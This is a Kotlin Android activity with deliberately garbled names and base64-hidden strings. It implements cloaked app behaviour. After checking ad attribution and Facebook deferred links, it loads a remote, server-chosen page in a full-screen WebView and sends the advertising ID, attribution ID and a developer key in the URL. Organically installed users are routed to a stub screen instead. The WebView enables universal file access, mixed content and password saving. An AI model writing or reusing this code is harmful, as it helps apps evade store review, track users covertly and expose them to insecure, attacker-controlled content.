package com.moecxi.terreuas


import android.annotation.SuppressLint
import android.content.ActivityNotFoundException
import android.content.Intent
import android.graphics.Bitmap
import android.net.Uri
import android.os.Bundle
import android.os.Handler
import android.os.Looper
import android.view.ViewGroup
import android.webkit.*
import androidx.activity.ComponentActivity
import androidx.activity.compose.BackHandler
import androidx.activity.compose.setContent
import androidx.compose.foundation.layout.*
import androidx.compose.material.LinearProgressIndicator
import androidx.compose.runtime.*
import androidx.compose.ui.Modifier
import androidx.compose.ui.draw.alpha
import androidx.compose.ui.graphics.Color.Companion.Red
import androidx.compose.ui.unit.dp
import androidx.compose.ui.viewinterop.AndroidView
import com.facebook.FacebookSdk
import com.facebook.applinks.AppLinkData
import com.onesignal.OneSignal
import kotlinx.coroutines.DelicateCoroutinesApi
import kotlinx.coroutines.GlobalScope
import kotlinx.coroutines.launch
var ferara: String? = null
var devasetf = "UGtyWEJwTUNlWWt3eFY3NkRadThxaw=="
var papdapq: String? = null
var pp = PPPA()
@DelicateCoroutinesApi
class MT8 : ComponentActivity() {
    private var iqiwsqqq: ValueCallback<Array<Uri>>? = null
    private var siganosx = "YzljNWM4ODEtMGZmZC00MzljLWI3NWYtYmE0NDljOGM5YWFl"
    @SuppressLint("SetJavaScriptEnabled")
    var apisq = ADDDF()
    @SuppressLint("SetJavaScriptEnabled")
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        window.addFlags(1024)
        apisq.standede(this)
        apisq.OPQSA(this)
        OneSignal.setLogLevel(OneSignal.LOG_LEVEL.VERBOSE, OneSignal.LOG_LEVEL.NONE)
        OneSignal.initWithContext(this)
        OneSignal.setAppId(pp.Darika(siganosx))
        val savida = getSharedPreferences(packageName, MODE_PRIVATE).getString("Loaws", null)
        
        if (apisq.DELAQ(this) == 0) {
            if (savida != null) {
                setContent {
                    var Progereres: Int by remember { mutableStateOf(-1) }
                    Box {
                        WEBEBEROCHAS(
                            modifier = Modifier.fillMaxSize(),
                            urara = savida.toString(),
                            onERProgre = { prontoPRog ->
                                Progereres = prontoPRog
                            }, OhBack = { repa ->
                                if (repa?.canGoBack() == true) {
                                    repa.goBack()
                                }
                            }
                        )
                        LinearProgressIndicator(
                            progress = Progereres * 1.0F / 100F,
                            modifier = Modifier
                                .padding(top = 200.dp)
                                .fillMaxWidth()
                                .alpha(if (Progereres == 100) 0f else 5f),
                            color = Red
                        )
                    }
                }
            } else {
                GlobalScope.launch {
                    pp.gerbqk()
                    FacebookSdk.setApplicationId(pp.Feqeq!!)
                    FacebookSdk.setAdvertiserIDCollectionEnabled(true)
                    FacebookSdk.sdkInitialize(applicationContext)
                    FacebookSdk.setAutoLogAppEventsEnabled(true)
                    FacebookSdk.setAutoInitEnabled(true)
                    FacebookSdk.fullyInitialize()
                    AppLinkData.fetchDeferredAppLinkData(this@MT8) { apolinocha ->
                        var apichas = apolinocha
                        if (apichas == null) {
                            apichas = AppLinkData.createFromActivity(this@MT8)
                        }
                        if (apichas != null) {
                            val urisaq = apichas.targetUri
                            ferara = urisaq?.query.toString()
                            papdapq = pp.PAPAMIQS(ferara!!)
                        }
                    }
                    Handler(Looper.getMainLooper()).postDelayed({
                        if (apurqs.equals(pp.Darika("Tm9uLW9yZ2FuaWM="))) {
                            val ytrrr = pp.lelale + rupers
                            setContent {
                                var depepe: Int by remember { mutableStateOf(-1) }
                                Box {
                                    WEBEBEROCHAS(
                                        modifier = Modifier.fillMaxSize(),
                                        urara = ytrrr,
                                        onERProgre = { progerone ->
                                            depepe = progerone
                                        }, OhBack = { wekere ->
                                            if (wekere?.canGoBack() == true) {
                                                wekere.goBack()
                                            }
                                        }
                                    )
                                    LinearProgressIndicator(
                                        progress = depepe * 1.0F / 100F,
                                        modifier = Modifier
                                            .padding(top = 200.dp)
                                            .fillMaxWidth()
                                            .alpha(if (depepe == 100) 0f else 5f),
                                        color = Red
                                    )
                                }
                            }
                        } else if (papdapq != null) {
                            val ooore = pp.lelale + papdapq
                            setContent {
                                var rebere: Int by remember { mutableStateOf(-1) }
                                Box {
                                    WEBEBEROCHAS(
                                        modifier = Modifier.fillMaxSize(),
                                        urara = ooore,
                                        onERProgre = { oooprog ->
                                            rebere = oooprog
                                        }, OhBack = { webchik ->
                                            if (webchik?.canGoBack() == true) {
                                                webchik.goBack()
                                            }
                                        }
                                    )
                                    LinearProgressIndicator(
                                        progress = rebere * 1.0F / 100F,
                                        modifier = Modifier
                                            .padding(top = 200.dp)
                                            .fillMaxWidth()
                                            .alpha(if (rebere == 100) 0f else 5f),
                                                color = Red
                                    )
                                }
                            }
                        }
                        else {
                            if (pp.KEPere == pp.Darika("Tk8=")) {
                                val intozere = Intent(this@MT8, STGAGA::class.java)
                                startActivity(intozere)
                            }
                            else {
                                val parasra = pp.KEPere + pp.Darika("P2J1bmRsZT0=") + pp.Darika(
                                    pararasnq
                                ) + pp.Darika("JmFkX2lkPQ==") + yhqbs + pp.Darika("JmFwcHNfaWQ9") +
                                        apsqstt + pp.Darika("JmRldl9rZXk9") + pp.Darika(
                                    devasetf
                                )
                                val litttr = pp.lelale + parasra
                                setContent {
                                    var regroge: Int by remember { mutableStateOf(-1) }
                                    Box {
                                        WEBEBEROCHAS(
                                            modifier = Modifier.fillMaxSize(),
                                            urara = litttr,
                                            onERProgre = { oooprog ->
                                                regroge = oooprog },
                                            OhBack = { wigrod ->
                                                if (wigrod?.canGoBack() == true) {
                                                    wigrod.goBack()
                                                }
                                            }
                                        )
                                        LinearProgressIndicator(
                                            progress = regroge * 1.0F / 100F,
                                            modifier = Modifier
                                                .padding(top = 200.dp)
                                                .fillMaxWidth()
                                                .alpha(if (regroge == 100) 0f else 5f)
                                            , color = Red)
                                    }

                                }
                            }
                        }

                    }, 5000)
                }
            }
        } else {
            val uuueq = Intent(this@MT8, STGAGA::class.java)
            startActivity(uuueq)
        }
    }


    @SuppressLint("SetJavaScriptEnabled")
    @Composable
    fun WEBEBEROCHAS(
        modifier: Modifier = Modifier,
        urara: String,
        OhBack: (webView: WebView?) -> Unit,
        onERProgre: (progress: Int) -> Unit = {}
    ) {

        val ChomerereCl = object : WebChromeClient() {
            override fun onShowFileChooser(
                wewe: WebView?,
                filere: ValueCallback<Array<Uri>>?,
                coshere: FileChooserParams?
            ): Boolean {
                if (iqiwsqqq != null) {
                    iqiwsqqq!!.onReceiveValue(null)
                    iqiwsqqq = null
                }
                iqiwsqqq = filere
                try {
                    val korsqs = Intent(Intent.ACTION_GET_CONTENT)
                    korsqs.addCategory(Intent.CATEGORY_OPENABLE)
                    korsqs.type = "*/*"
                    startActivityForResult(
                        Intent.createChooser(korsqs, "FIPAQS"),
                        100
                    )
                } catch (eteea: ActivityNotFoundException) {
                    iqiwsqqq = null
                    return false
                }
                return true

            }


            override fun onProgressChanged(yrq: WebView?, kqprogen: Int) {
                onERProgre(kqprogen)
                super.onProgressChanged(yrq, kqprogen)
            }
        }
        val VWVWCLI = object : WebViewClient() {
            override fun onPageStarted(wew: WebView?, urlue: String?, faviconndnq: Bitmap?) {
                super.onPageStarted(wew, urlue, faviconndnq)
                onERProgre(-1)
                if (urlue?.contains(pp.Darika("Z2FwcHM9NDA0")) == true) {
                    val oqos = Intent(this@MT8, STGAGA::class.java)
                    startActivity(oqos)
                }
            }

            override fun onPageFinished(piers: WebView?, pqose: String?) {
                super.onPageFinished(piers, pqose)
                onERProgre(100)
                getSharedPreferences(packageName, MODE_PRIVATE).edit().putString("Loaws", pqose)
                    .apply()

            }

        }
        var wbyeq: WebView? = null
        AndroidView(modifier = modifier, factory = { ctx ->
            WebView(ctx).apply {
                layoutParams = ViewGroup.LayoutParams(
                    ViewGroup.LayoutParams.MATCH_PARENT,
                    ViewGroup.LayoutParams.MATCH_PARENT
                )
                this.webViewClient = VWVWCLI
                this.webChromeClient = ChomerereCl
                settings.apply {
                    setAppCacheEnabled(true)
                    allowFileAccessFromFileURLs = true
                    saveFormData = true
                    mixedContentMode = 0
                    savePassword = true
                    allowContentAccess = true
                    setRenderPriority(WebSettings.RenderPriority.HIGH)
                    setEnableSmoothTransition(true)
                    loadsImagesAutomatically = true
                    allowUniversalAccessFromFileURLs = true
                    databaseEnabled = true
                    loadWithOverviewMode = true
                    useWideViewPort = true
                    javaScriptCanOpenWindowsAutomatically = true
                    domStorageEnabled = true
                    allowFileAccess = true
                    javaScriptEnabled = true
                }
                wbyeq = this
                loadUrl(urara)
            }
        })
        BackHandler {
            OhBack(wbyeq)
        }
    }


    override fun onActivityResult(reposqC: Int, resikaks: Int, drais: Intent?) {
        super.onActivityResult(reposqC, resikaks, drais)
        if (reposqC == 100) {
            if (iqiwsqqq == null) return
            iqiwsqqq!!.onReceiveValue(
                WebChromeClient.FileChooserParams.parseResult(
                    resikaks,
                    drais
                )
            )
            iqiwsqqq = null
        }
    }


}